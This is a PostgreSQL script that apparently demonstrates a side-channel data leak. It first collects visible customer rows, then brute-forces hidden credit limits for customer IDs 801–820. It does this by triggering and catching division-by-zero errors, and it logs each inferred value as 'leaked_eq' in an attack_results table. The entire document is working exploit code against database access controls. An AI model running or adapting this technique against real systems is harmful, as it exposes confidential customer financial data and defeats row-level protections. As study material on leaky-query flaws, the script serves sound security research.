DROP TABLE IF EXISTS attack_results;
CREATE TEMP TABLE attack_results (customer_id int, credit_limit int, source text);


DO $$
DECLARE
   cust_id INT;
   credit  INT;
   found_row RECORD;
   already_known INT[];
BEGIN
   FOR found_row IN SELECT customer_id, credit_limit FROM customers LOOP
       INSERT INTO attack_results VALUES (found_row.customer_id, found_row.credit_limit, 'legit');
   END LOOP;


   SELECT array_agg(customer_id) INTO already_known FROM attack_results;


   FOR cust_id IN 801..820 LOOP
       CONTINUE WHEN already_known @> ARRAY[cust_id];
       credit := 0;
       WHILE credit < 10000 LOOP
           BEGIN
               PERFORM 1 FROM customers
               WHERE customer_id = cust_id
                 AND 1/(credit_limit - credit) = 0;
           EXCEPTION WHEN division_by_zero THEN
               INSERT INTO attack_results VALUES (cust_id, credit, 'leaked_eq');
               EXIT;
           END;
           credit := credit + 1;
       END LOOP;
   END LOOP;
END $$;
